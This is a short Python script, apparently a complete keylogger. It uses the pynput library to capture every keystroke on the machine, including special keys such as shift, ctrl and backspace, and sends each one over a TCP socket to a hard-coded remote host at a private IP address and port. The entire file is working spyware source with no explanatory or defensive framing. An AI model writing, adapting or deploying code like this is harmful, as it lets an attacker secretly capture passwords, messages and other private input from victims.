import pynput.keyboard as ky
import socket as soc

socket=soc.socket(soc.AF_INET,soc.SOCK_STREAM)
socket.connect(("192.168.1.66",1234))

def asd(a):
    if ky.Key.esc==a:
        socket.send("esc".encode())
    elif ky.Key.space==a:
        socket.send("<space>".encode())
    elif ky.Key.backspace==a:
        socket.send("<back_space>".encode())
    elif ky.Key.alt==a:
        socket.send("<alt>".encode())
    elif ky.Key.alt_gr==a:
        socket.send("<alt_gr>".encode())
    elif ky.Key.caps_lock==a:
        socket.send("<caps_lock>".encode())
    elif ky.Key.ctrl==a:
        socket.send("<ctrl>".encode())
    elif ky.Key.cmd==a:
        socket.send("<cmd>".encode())
    elif ky.Key.shift==a:
        socket.send("<shift>".encode())
    else:
        try:
            socket.send(a.char.encode())
        except:
            socket.send("<error>".encode())

#
with ky.Listener(on_press=asd) as asd:
    asd.join()